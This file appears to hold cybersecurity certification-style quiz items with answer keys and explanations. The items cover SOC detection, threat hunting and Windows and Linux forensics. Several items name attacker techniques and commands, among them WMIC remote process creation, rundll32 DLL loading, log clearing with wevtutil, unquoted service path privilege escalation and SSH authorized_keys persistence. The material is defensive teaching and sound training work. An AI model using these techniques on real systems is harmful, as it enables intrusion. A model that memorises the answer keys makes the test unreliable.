{q:"Which Windows built-in tool, when used by an attacker with valid credentials, provides the clearest example of fileless lateral movement?",o:["Notepad.exe","WMIC — wmic.exe /node:TARGET process call create executes commands on remote systems using legitimate WMI protocols without dropping files","Calculator.exe","Mspaint.exe"],a:1,d:1,e:"WMIC lateral movement: an attacker uses wmic.exe to execute processes on remote systems over WMI (TCP 135). No files are copied — the command runs directly on the remote system's process list. Detection: Event ID 4688 showing wmic.exe with /node: argument on the source, plus process creation events on the target system. Microsoft Defender ASR rules can block wmic.exe from creating child processes."},
{q:"Which technique allows malware to execute code in memory without writing files to disk, evading traditional signature-based antivirus?",o:["Registry persistence","Fileless execution — running code entirely in memory using PowerShell, WMI, .NET, or reflective DLL injection without creating files on disk","Boot sector infection","Standard service installation"],a:1,d:1,e:"Fileless malware uses built-in OS capabilities: PowerShell with IEX downloading scripts into memory, WMI executing scripts without disk writes, .NET loading assemblies reflectively, or process injection inserting shellcode into running processes. Traditional AV scans files — fileless code has no file to scan. Detection requires: memory scanning, behavioral monitoring, and script-block logging."},
{q:"An analyst sees Sysmon Event ID 1 showing: ParentImage=WINWORD.EXE, Image=cmd.exe, CommandLine=cmd.exe /c powershell.exe -enc \x3Cbase64\x3E. What attack technique is this?",o:["Normal Office macro behavior","Malicious macro execution (T1566.001) — a Word document macro spawned cmd.exe which launched encoded PowerShell, a common initial access vector","Office automation testing","Legitimate document processing"],a:1,d:1,e:"Macro-based malware: Word macro runs, spawns cmd.exe, which runs encoded PowerShell to download or execute payload. This parent-child chain (Office app to cmd to powershell) should never occur in legitimate use. Microsoft Attack Surface Reduction (ASR) rules block Office applications from creating child processes. Sysmon with parent-child tracking is essential for detecting this."},
{q:"A process named 'conhost.exe' is running from C:\\Users\\Public\\ and consuming 98% CPU. This MOST likely indicates:",o:["Legitimate console host process","Cryptomining malware masquerading as conhost.exe — legitimate conhost.exe runs only from C:\\Windows\\System32 and does not consume sustained high CPU. User-writable path plus high CPU = cryptominer","Normal Windows update","Antivirus deep scan"],a:1,d:1,e:"Cryptomining malware characteristics: sustained high CPU (mining cryptocurrency), masquerades as a legitimate Windows process, runs from a user-writable directory (no admin required). Legitimate conhost.exe: only from C:\\Windows\\System32, near-zero CPU when idle. Wrong path plus sustained high CPU = cryptominer requiring full investigation even if less impactful than ransomware."},
{q:"Which attack targets Active Directory by requesting service tickets encrypted with weak RC4 that can be cracked offline to reveal service account passwords?",o:["Pass-the-Hash","Kerberoasting (T1558.003) — requesting Kerberos Service Tickets for service accounts then cracking them offline to obtain plaintext passwords","Golden Ticket attack","Silver Ticket attack"],a:1,d:1,e:"Kerberoasting: any authenticated domain user can request service tickets for any SPN (Service Principal Name). These tickets are encrypted with the service account password hash. Attackers request them offline, then crack with hashcat/John. Detections: Event 4769 with RC4 encryption type 0x17, unusual service ticket requests from non-admin users. Mitigation: use managed service accounts (MSAs) with complex auto-rotating passwords."},
{q:"An analyst finds that a compromised host made 847 outbound DNS queries in 10 minutes, with 823 returning NXDOMAIN. The domains appear random (e.g., xpqmvlzrt.com, hfbkzpwqy.net). This indicates:",o:["DNS server misconfiguration","Domain Generation Algorithm (DGA) malware — generating pseudo-random domain names to locate C2 servers, creating a flood of NXDOMAIN responses for unregistered domains","Normal DNS caching behavior","Browser prefetching"],a:1,d:1,e:"DGA malware generates hundreds of pseudo-random domain names and tries each until one resolves to the C2 server. The attacker pre-registers just one of the generated domains per time period. The flood of NXDOMAIN for random-looking domains is the signature. Detection: statistical analysis of DNS query patterns, comparison against known DGA algorithms. Once identified, analysts can predict future domains to preemptively block them."},
{q:"Which Windows artifact records historical application execution including programs that have since been deleted from disk?",o:["Current running processes","Shimcache (AppCompatCache) — records metadata about executed files including path and last modification time, persisting even after the file is deleted","Event Viewer only","Browser history"],a:1,d:1,e:"Shimcache (HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache) records file path, size, and last modified time for executables that ran on the system. Critically, entries persist even after file deletion, providing forensic evidence of past execution. Analysts use shimcache to prove malware was run on a system even after cleanup. Attackers sometimes clear it, but its absence can itself be suspicious."},
{q:"An organization deploys canary DNS tokens — fake internal hostnames that legitimate systems should never query. An alert fires showing one internal host queried a canary hostname. The analyst's assessment is:",o:["False positive — DNS queries are normal","High-confidence compromise indicator — only an attacker enumerating internal DNS records would query a canary hostname. No legitimate system should ever make this query","DNS cache issue","Configuration error"],a:1,d:1,e:"Canary DNS tokens are high-fidelity honeytokens: internal DNS entries that appear legitimate in reconnaissance output but lead nowhere real. Any query to a canary hostname means: (1) an attacker enumerated internal DNS, (2) found the canary entry, (3) attempted to connect. Zero false positives by design. The querying host is compromised or running attacker tooling. Immediate investigation of that host is warranted."},
{q:"During a threat hunt, an analyst discovers PowerShell commands encoded with base64 in Event ID 4104 logs. The command decodes to a PowerShell download cradle. The analyst should:",o:["Ignore — PowerShell is used legitimately","Decode all encoded commands in the investigation window, identify the downloaded payload URL, check if the payload was retrieved and executed, and hunt for the same cradle across all endpoints","Only alert if malware is detected","Report to the vendor"],a:1,d:1,e:"Encoded PowerShell is nearly always suspicious in enterprise environments. Decoding (base64 -d on Linux, or [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String()) in PowerShell) reveals the actual command. Once decoded, retrieve and analyze the payload URL. Hunt the same encoded command across all endpoints using SIEM or EDR telemetry — this may reveal the full infection scope."},
{q:"Which approach to security monitoring focuses on assuming the network is already compromised rather than trying to prevent all intrusions?",o:["Perimeter-only security","Assume breach / threat hunting mindset — proactively searching for evidence of compromise that automated tools have not yet detected, accepting that some attacks will succeed","Zero-tolerance intrusion policy","Compliance-based monitoring"],a:1,d:1,e:"Assume breach: given the sophistication of modern attacks, some will succeed. Rather than only monitoring for prevention, analysts proactively hunt for signs of existing compromise: unusual process trees, unexpected network connections, anomalous user behavior. This mental model drives threat hunting programs, Zero Trust architecture (don't trust, always verify), and incident response preparation. Organizations that assume breach detect intrusions faster."},
{q:"Which SIEM correlation rule would MOST effectively detect a user account being used simultaneously from geographically impossible locations?",o:["Alert on all logins from foreign countries","Correlate authentication events from the same account within a time window that is physically impossible to travel between source locations — impossible travel detection","Block all international logins","Alert on VPN usage only"],a:1,d:1,e:"Impossible travel detection: if account A logs in from New York at 9:00 AM and from Tokyo at 9:30 AM (an impossible 30-minute journey), one or both sessions involve credential theft or VPN. SIEM correlates: same account, multiple geolocation-mapped IPs, timestamp delta less than travel time between locations. This catches credential compromise where attackers in different countries use stolen credentials simultaneously with the legitimate owner."},
{q:"An analyst discovers Base64-encoded content in an HTTP POST body going to an external IP. The encoding is consistent across multiple sessions. What should the analyst do FIRST?",o:["Block the IP","Decode the base64 content to understand what data is being transmitted — determines whether this is legitimate application data or exfiltration","Ignore — base64 is normal in web traffic","Escalate immediately without investigation"],a:1,d:1,e:"Base64 is commonly used in legitimate web traffic (APIs, file uploads, authentication tokens). The analyst cannot determine if this is malicious without knowing what the content is. Decoding reveals: legitimate JSON/XML API data (legitimate) vs. internal file contents, credentials, or database records (exfiltration). Context matters: which process is making the request, what endpoint, what is the volume over time, and does the decoded content match expected application behavior."},
{q:"An analyst sees Event ID 4625 (failed logon) with Logon Type 10 (RemoteInteractive) across 30 different accounts from one external IP. Logon Type 10 specifically indicates the attacker is targeting:",o:["Network file shares", "RDP (Remote Desktop Protocol) — Logon Type 10 is RemoteInteractive, the logon type used exclusively by RDP connections. This indicates an RDP brute-force or password spray attack against the RDP service", "SSH service", "VPN portal"],a:1,d:1,e:"Logon types: 2=Interactive (console), 3=Network, 4=Batch, 5=Service, 7=Unlock, 8=NetworkCleartext, 9=NewCredentials, 10=RemoteInteractive (RDP), 11=CachedInteractive. Logon Type 10 across 30 accounts from one IP = RDP password spray. Immediate actions: block the source IP, ensure account lockout policies are in force, verify RDP is not internet-exposed, and check whether any account was successfully compromised (look for corresponding 4624 events)."},
{q:"Which Sysmon configuration setting is required to detect the specific command-line arguments used when spawning a process?",o:["Network monitoring enabled", "Process creation logging with CommandLine enabled (Event ID 1 with full command-line logging) — without this, process creation events show the executable path but not the arguments", "File creation monitoring", "DNS query logging"],a:1,d:1,e:"By default, Windows process creation auditing (Event ID 4688) may not include command-line arguments unless the policy is specifically enabled. Sysmon Event ID 1 includes command-line by default in most configurations. This is critical for detecting: encoded PowerShell, malicious script arguments, certutil download commands, and other LOTL techniques that look benign without seeing the arguments. Command-line logging is one of the highest-value security audit settings."},
{q:"A SOC analyst receives a threat intel report that an APT group is actively exploiting CVE-2024-XXXX in unpatched VPN appliances. The analyst's FIRST action is:",o:["Wait for the patch — nothing can be done without a patch", "Immediately determine if any organizational VPN appliances are vulnerable by checking version numbers against the advisory, then escalate for emergency patching or mitigation", "Update threat intelligence platform", "Notify all employees"],a:1,d:1,e:"Active exploitation of VPN vulnerabilities by APTs is one of the most urgent threat scenarios — VPN appliances are internet-facing, often handle privileged access, and are hard to monitor from the inside. First action: scope (do we have vulnerable appliances?). If yes: escalate immediately for emergency patching or mitigation. If a patch isn't available, consider: blocking known-bad IPs from the advisory, implementing WAF rules, or taking vulnerable appliances offline until patched."},
{q:"During log analysis, an analyst identifies that a Windows host queried the internal DNS for 'domaincontroller.corp.local' successfully, then immediately ran 'nltest /dclist:corp.local'. This sequence is characteristic of:",o:["Normal domain-joined workstation behavior", "Internal reconnaissance — querying for domain controllers by name then using nltest to enumerate all DCs is a post-compromise discovery technique (T1018, T1087)", "Software deployment activity", "IT support activity"],a:1,d:1,e:"nltest /dclist: enumerates all domain controllers in the specified domain — a common attacker discovery step after initial compromise to identify targets for lateral movement. Combined with DC name resolution, this sequence indicates an attacker (or compromised endpoint) mapping the AD environment. Legitimate admin tools like nltest should be whitelisted to known admin systems — any workstation running nltest is suspicious."},
{q:"Which file system artifact records every read and write operation to the Windows NTFS volume journal, useful for proving a specific file was accessed even after deletion?",o:["Recycle Bin", "The $UsnJrnl (Update Sequence Number Journal) — records file system changes including creation, modification, deletion, and renaming with timestamps", "Temp folder", "Windows.edb search index"],a:1,d:1,e:"$UsnJrnl (located at \\$Extend\\$UsnJrnl:$J) is a circular log of NTFS file system operations. Each entry records: operation type (create/write/delete/rename), file name, timestamps, and file attributes. Even after file deletion, the $UsnJrnl entry may persist (until overwritten by the circular log). Forensic tools like MFTECmd can parse $UsnJrnl to reconstruct what files were created, modified, or deleted during the attack window."},
{q:"An analyst is reviewing firewall logs and notices consistent large outbound transfers (500MB-2GB) to a cloud storage provider (AWS S3) from a specific server at 1 AM nightly. The analyst should:",o:["Ignore — cloud backups are common", "Verify this transfer is an authorized and documented backup job. If no backup documentation exists, this is potential data exfiltration disguised as backup traffic — one of the most common exfiltration techniques", "Block AWS S3 entirely", "Only alert if the transfer exceeds 10GB"],a:1,d:1,e:"Legitimate cloud backups exist but should be documented in asset management and backup documentation. Undocumented large nightly transfers to cloud storage are a classic data exfiltration technique — attackers use legitimate cloud services to blend in. Verify: is this server supposed to back up to S3? Is the destination bucket owned by the organization? What data is being transferred? Is there an authorized service account making these transfers?"},
{q:"Which Windows Event Log channel records PowerShell script execution details including decoded script block content?",o:["System log", "Microsoft-Windows-PowerShell/Operational log (Event ID 4103 and 4104) — captures pipeline execution and script block content, defeating most PowerShell obfuscation techniques", "Application log", "Security log"],a:1,d:1,e:"PowerShell logging levels: Module Logging (4103 — pipeline execution), Script Block Logging (4104 — records all script blocks executed, decoding base64 and other obfuscation), Transcription (records all input/output). Event ID 4104 is the most valuable — it captures the actual commands that ran regardless of obfuscation, enabling analysis of encoded or obfuscated PowerShell. Requires enabling via Group Policy: Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell."},
{q:"A threat hunt hypothesis states: 'Attackers in our network may be using Cobalt Strike, which has a characteristic JARM fingerprint of 07d14d16d21d21d00042d41d00041d'. How should the analyst test this?",o:["Run antivirus scans", "Query network monitoring tools (Zeek, NDR) for TLS connections with this specific JARM fingerprint — JARM actively probes servers and fingerprints their TLS stack, identifying Cobalt Strike team servers even when domain/IP rotate", "Check firewall block lists", "Review DHCP logs"],a:1,d:1,e:"JARM (Salesforce) actively fingerprints TLS server implementations by sending specific probes and hashing the responses. Cobalt Strike team servers have a distinctive JARM fingerprint that persists across domain and IP changes because the underlying C2 framework code produces the same TLS responses. Query network logs for outbound connections with this fingerprint. Any internal host connecting to a JARM-matched Cobalt Strike server is likely compromised."},
{q:"Which artifact from a Windows system provides evidence of USB storage device connections including vendor, product name, and first/last connection times?",o:["Windows Firewall logs", "USBSTOR registry key (HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR) combined with setupapi.dev.log — records device details and connection timestamps for every USB storage device ever connected", "Event ID 4624", "Browser history"],a:1,d:1,e:"USBSTOR registry key: records vendor, product, and serial number for every USB storage device ever connected. SetupAPI.dev.log: records timestamps when new devices installed. Windows Event IDs 2003/2004/2005 in the Microsoft-Windows-DriverFrameworks-UserMode log record connection events. Together these prove: which specific USB device (by serial number) was connected to which system and when — critical evidence in insider threat cases."},
{q:"An analyst investigating a potential compromise finds that an attacker deleted Windows event logs using 'wevtutil cl Security'. Which log source may still have the deleted events?",o:["The local system — logs are permanently deleted", "A centralized SIEM or syslog server where events were forwarded before deletion — this is why centralized log collection is critical; local log tampering (T1070.001) cannot retroactively delete already-forwarded events", "Shadow copies only", "Backup tapes only"],a:1,d:1,e:"Centralized log collection is the primary countermeasure to local log tampering. Events forwarded to a SIEM or syslog server before deletion are preserved — the attacker would need to compromise the SIEM as well to erase their tracks there. This is why log forwarding should happen in near-real-time and the SIEM should be isolated with restricted access. Volume Shadow Copies may also preserve old event log files if not cleared by the attacker."},
{q:"Which behavior is MOST indicative of a compromised account versus a user simply accessing systems they don't normally access?",o:["Accessing resources during business hours", "Accessing sensitive systems from a new device AND location, at an unusual time, immediately after a phishing campaign targeted the organization — multiple simultaneous risk factors compound the confidence level", "Any access to a new system", "Any after-hours access"],a:1,d:1,e:"Single anomalies (new location, new device, off-hours) each have moderate false positive rates individually. When multiple risk factors appear simultaneously in context — new device + new location + off-hours + post-phishing campaign timeframe — the compound probability of legitimacy drops dramatically. UEBA scoring adds risk factors multiplicatively. Analysts should correlate indicators rather than treating each in isolation."},
{q:"Which MITRE ATT&CK technique involves an attacker using a legitimate remote access tool already approved in the environment to avoid detection?",o:["T1059 Command and Scripting Interpreter", "T1219 Remote Access Software — using legitimate tools (TeamViewer, AnyDesk, Zoho Assist) installed by the attacker that blend in with approved remote management software", "T1547 Boot Autostart Execution", "T1003 Credential Dumping"],a:1,d:1,e:"Attackers install legitimate remote access tools (RATs) that IT departments also use — TeamViewer, AnyDesk, ConnectWise — to maintain access. These generate no malware alerts (they're legitimate software), appear in telemetry as normal remote management, and survive reboots if installed as services. Detection: inventory of authorized remote access tools, alerting on installation of unapproved remote access software, monitoring for remote access tool connections to unexpected destinations."},
{q:"During a forensic investigation, an analyst finds a file with no extension in C:\\Windows\\System32 named with a random 8-character string. Hash lookup returns no results on VirusTotal. What is the NEXT step?",o:["Delete it immediately", "Submit to a sandbox for dynamic analysis — a VirusTotal miss means either legitimate software (unlikely in System32 with no extension and random name) or novel malware. Sandboxing reveals behavior without risk", "Report as false positive", "Ignore — System32 files are safe"],a:1,d:1,e:"VirusTotal miss on a suspicious file means: (1) very new malware not yet in databases, (2) custom/targeted malware compiled for this specific victim (common in APTs), or (3) legitimate file. Random 8-char name with no extension in System32 is unusual for legitimate software. Sandbox analysis (Any.run, Cuckoo, Joe Sandbox) reveals what the file actually does: what network connections it makes, what files it creates, what registry keys it modifies — regardless of signatures."},
{q:"An analyst investigating a Linux breach finds entries in /etc/cron.d/ that weren't there before. The entries were added 3 days ago. What is the significance of this location versus user crontabs?",o:["No difference — all cron locations are equivalent", "Cron jobs in /etc/cron.d/ execute as root and survive user account deletion — attackers prefer system cron locations for persistent, privileged execution that outlasts user-level cleanup attempts", "Only admins can see /etc/cron.d/", "Jobs in /etc/cron.d/ run only once"],a:1,d:1,e:"/etc/cron.d/ is system-level and runs as root by default. User crontabs (crontab -e) run as the user and are removed if the user account is deleted. Attackers prefer /etc/cron.d/ for: root-level execution, persistence that survives user account remediation, and a location that may be overlooked during cleanup. During Linux IR, always check all cron locations: /etc/crontab, /etc/cron.d/, /var/spool/cron/crontabs/, and /etc/cron.{hourly,daily,weekly,monthly}/."},
{q:"Which Windows built-in log can reveal an attacker's RDP session activity including display resolution, client name, and IP address?",o:["Windows Firewall log", "Microsoft-Windows-TerminalServices-RemoteConnectionManager and LocalSessionManager event logs — record RDP connection details including client IP, username, session ID, and connection/disconnection times", "IIS access log", "DNS client log"],a:1,d:1,e:"RDP forensics: Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational (Event ID 1149 = auth, includes client IP), Microsoft-Windows-TerminalServices-LocalSessionManager/Operational (21=logon, 23=logoff, 24=disconnect, 25=reconnect), and Security log 4624/4625 with Logon Type 10. These records show the full RDP session lifecycle — when each session connected, the client IP, and how long it lasted."},
{q:"A SOC receives an alert: large volumes of data sent to paste.c0m (a pastebin-like site). Investigation reveals the data includes base64-encoded strings. This is MOST concerning because:",o:["Pastebin is always malicious", "Pastebin-style services are commonly used for data exfiltration and dead-drop C2 — base64 encoding suggests structured data being exfiltrated to a service that's difficult to block without affecting legitimate use", "Base64 is always malicious", "Large uploads indicate bandwidth testing"],a:1,d:1,e:"Exfiltration to paste sites (pastebin, hastebin, paste.c0m) is common because: they use standard HTTPS (blend with web traffic), are free and anonymous, allow large data uploads, and blocking them affects legitimate developer use (organizational resistance). Base64-encoded structured data (JSON, XML, file contents) strongly suggests exfiltration rather than legitimate paste use. Investigate what data is in the encoded strings and which process is making the uploads."},
{q:"Which security capability detects when an authenticated user accesses resources outside their normal job function, even if their permissions technically allow it?",o:["Role-based access control (RBAC)", "UEBA anomaly detection — identifies access patterns deviating from behavioral baselines, catching privileged misuse that authorization controls don't prevent", "Firewall rules", "Password complexity requirements"],a:1,d:1,e:"RBAC prevents unauthorized access. UEBA catches authorized but abnormal access. A finance employee with legitimate access to financial systems who suddenly accesses HR records, source code repositories, and customer databases (all permitted by over-broad permissions) deviates from their behavioral baseline. UEBA generates an alert; RBAC saw nothing wrong because permissions existed for each individual access. This is critical for insider threat detection."},
{q:"An analyst discovers that an attacker compressed and encrypted files before exfiltration using 7-Zip with a password. Which forensic artifact might still reveal the original file names?",o:["The encrypted archive itself", "Windows Prefetch for 7z.exe, command-line logs (Event ID 4688/Sysmon Event ID 1) showing the exact 7z.exe command with file names, and possibly LNK files or shellbags showing which folders were accessed", "The encrypted file content", "Network traffic only"],a:1,d:1,e:"Even when files are encrypted, the command that created the encryption often leaves traces: Event ID 4688/Sysmon Event ID 1 records the full command line including: 7z.exe a -pPASSWORD archive.7z C:\\Sensitive\\Data\\*. This reveals the source path of exfiltrated files. Additionally: Prefetch for 7z.exe shows execution, shellbags show directory browsing history, and LNK files show recently accessed items — all before encryption occurred."},
{q:"Which behavior in firewall logs indicates an attacker is performing slow, distributed port scanning to avoid detection?",o:["10,000 port scans per second from one IP", "Port scans distributed across multiple source IPs over multiple hours or days, each source scanning only a few ports — low-and-slow scanning below per-source thresholds but detectable by aggregating across sources", "Single connection from one IP", "Blocking all ICMP"],a:1,d:1,e:"Slow distributed scanning: each source IP sends only a few probes (below any per-source alert threshold), but they collectively scan the same destination. Detection requires: aggregate all sources scanning the same target, look for port completion across distributed sources, and correlate with threat intelligence on scanning infrastructure. Tools like Shodan conduct continuous global scanning — their IPs appear in distributed scan findings regularly."},
{q:"An analyst confirms that malware on a workstation has been using rundll32.exe to load a malicious DLL. What makes rundll32.exe a useful LOLBIN for attackers?",o:["rundll32.exe is rare and suspicious", "rundll32.exe is a legitimate Windows binary used to run DLL files — it appears in normal Windows activity and can load malicious DLLs without creating a new executable file, making it difficult to distinguish from legitimate use", "rundll32.exe has elevated privileges", "rundll32.exe bypasses all security software"],a:1,d:1,e:"rundll32.exe LOLBin abuse: attackers use it to run: 'rundll32.exe malicious.dll,EntryPoint' or even download and run DLLs via registered URL protocol handlers. Since rundll32.exe is a signed Microsoft binary that legitimately runs DLLs (for things like Windows screensavers and Control Panel applets), many security tools whitelist it. Detection: monitor rundll32.exe command-line arguments for unusual DLL paths, unsigned DLLs, or network connections made by rundll32."},
{q:"Which technique allows an attacker to maintain persistence on a Linux system by adding an authorized_keys entry to a compromised account?",o:["Creating a new user account", "Adding the attacker's SSH public key to ~/.ssh/authorized_keys — this enables passwordless SSH login for the attacker regardless of password changes, surviving password resets", "Installing a backdoor service", "Modifying /etc/passwd"],a:1,d:1,e:"SSH authorized_keys persistence (T1098.004): by adding their public key to a compromised user's authorized_keys file, an attacker can SSH into the system as that user without a password — indefinitely. Password changes don't affect this. Remediation: remove the unauthorized key. Detection: monitor changes to ~/.ssh/authorized_keys and /etc/ssh/authorized_keys2, alert on new key additions especially by non-owner processes. Audit authorized_keys across all user accounts during IR."},
{q:"A security monitoring tool alerts on a host making connections to IP addresses in the 100.64.0.0/10 range. An analyst should know this range is:",o:["Public internet space", "IANA-designated shared address space (RFC 6598) used by ISPs for carrier-grade NAT — connections to this range from an internal network may indicate traffic routing anomalies or misconfiguration", "Military network space", "Bogon space requiring immediate blocking"],a:1,d:1,e:"RFC 6598 defines 100.64.0.0/10 as shared address space for ISP carrier-grade NAT. This range should not appear as a destination in internal network traffic under normal circumstances. Internal hosts connecting to 100.64.0.0/10 may indicate: ISP infrastructure exposure, CGN misconfiguration, VPN tunnel routing issues, or potentially a misconfigured C2 server using this range. Context matters: ISP-managed services might legitimately use this range in some architectures."},
{q:"During threat hunting, an analyst looks for processes with network connections that have no corresponding DNS query in the proxy/DNS logs. This technique detects:",o:["Normal cached DNS responses", "Direct IP-based C2 communication — malware that hardcodes IP addresses rather than domains makes connections without generating DNS lookups, bypassing DNS-based detection and sinkholing", "VPN traffic", "Multicast traffic"],a:1,d:1,e:"DNS-free C2: malware hardcodes C2 IP addresses directly, making connections that never appear in DNS logs. This defeats: domain blocklists (no domain to block), DNS sinkholes (no DNS query to intercept), and DNS anomaly detection (no DGA patterns to find). Detection: correlate network connections with DNS queries — connections to IPs with no corresponding DNS lookup (adjusted for TTL caching) are suspicious and warrant investigation of the connecting process."},
{q:"An analyst finds that a compromised host has a process with a network connection to an IP address listed in the CISA Known Exploited Vulnerabilities supplementary data as a confirmed threat actor C2 IP. The response priority is:",o:["Low — one IP match might be coincidental", "Highest priority — CISA-confirmed threat actor infrastructure represents active, attributed C2 communication. The host should be immediately isolated and full IR initiated", "Medium — monitor for 24 hours first", "Wait for additional corroborating indicators"],a:1,d:1,e:"CISA-attributed threat actor IPs in official advisories are confirmed through government-level intelligence — these are high-confidence, not speculative. Any internal host connecting to a CISA-confirmed C2 IP means the host is compromised and in active communication with a known threat actor. Immediate isolation, memory capture, full IR. This is not a wait-for-more-evidence situation — the evidence is already high-confidence."},
{q:"Which technique does an attacker use to escalate privileges from a local account to SYSTEM on Windows by targeting a vulnerable service binary?",o:["Password spraying", "Unquoted service path exploitation — if a Windows service binary path contains spaces and is not quoted, Windows may execute a binary in a parent directory rather than the intended binary", "Pass-the-Hash", "Kerberoasting"],a:1,d:1,e:"Unquoted service path (T1574.009): 'C:\\Program Files\\Vulnerable App\\service.exe' is parsed by Windows as: try 'C:\\Program.exe', then 'C:\\Program Files\\Vulnerable.exe', then the actual path. If an attacker can write to any of the intermediate paths, they place their own binary there. When the service starts (at boot or on demand), it executes the attacker's binary as SYSTEM. Detection: audit for unquoted service paths (sc qc or PowerSploit's Get-ServiceUnquoted). Remediation: add quotes to all service paths."},
{q:"A network monitoring tool shows a host performing ARP requests for every IP in the 192.168.1.0/24 subnet within 30 seconds. This is characteristic of:",o:["Normal ARP behavior", "ARP scanning / host discovery — sweeping the local subnet to discover live hosts, typically a post-compromise internal reconnaissance step", "DHCP lease renewal", "Normal broadcast traffic"],a:1,d:1,e:"ARP scanning maps all live hosts on the local network segment without generating routable traffic (ARP is layer 2 and doesn't cross routers). It's a standard first step in internal reconnaissance after initial compromise — identify what other systems exist locally before attempting lateral movement. Detection: alert on ARP requests to more than N hosts within a time window from a single source. Normal ARP activity targets known IPs; scanning sweeps the entire subnet systematically."},
{q:"An analyst receives an alert: Event ID 4740 (Account Locked Out) for the Administrator account from source workstation WS-12. The significance is:",o:["Normal — Admin accounts get locked out frequently", "Credential attack against the built-in Administrator account originating from WS-12 — either WS-12 is compromised and running a brute-force tool, or an attacker has direct access to WS-12 and is attempting local admin credential attacks", "Password policy issue", "Test account activity"],a:1,d:1,e:"Event 4740 (account lockout) fires on the DC for domain accounts and locally for local accounts. The source workstation field identifies where the bad credentials are coming from. Built-in Administrator brute-force from a workstation: either a script/malware on WS-12 is trying admin credentials, or a person with WS-12 access is attempting to guess the admin password. Investigate WS-12 immediately: what process generated the failed logins? Was WS-12 recently compromised?"},
{q:"Which log analysis technique reduces analyst workload by automatically excluding known-good events from alert queues?",o:["Increasing alert thresholds globally", "Whitelist/allowlist enrichment — tagging known-good processes, IP addresses, and user behaviors so they are excluded or deprioritized, allowing analysts to focus on genuinely anomalous events", "Reducing logging verbosity", "Disabling SIEM rules"],a:1,d:1,e:"Allowlist enrichment improves signal-to-noise ratio: known-good software (McAfee scanner, backup agents, AD sync), known-good admin systems (jump servers, patch management servers), and documented scheduled tasks are tagged. Alerts involving only whitelisted entities are suppressed or lowered in priority. This can reduce alert volume by 80-90% while improving true positive rate. Allowlists must be carefully maintained — compromised whitelisted systems are a detection gap."},
{q:"An analyst is investigating a potential supply chain compromise. Which artifact would MOST help determine if a software update package was tampered with?",o:["The update's file size", "Digital signature verification of the update package against the vendor's published public key certificate — tampering invalidates the vendor's cryptographic signature", "The update's installation date", "Network traffic during installation"],a:1,d:1,e:"Legitimate software vendors sign their update packages with their code signing certificate. Tampered packages cannot reproduce the valid vendor signature (without the private key). Verification: check the Authenticode signature (Windows: Get-AuthenticodeSignature), compare the signing certificate to the vendor's published certificate details, verify the hash matches the vendor's published integrity values. If the signature is missing, invalid, or from an unexpected certificate, the package was tampered with."},
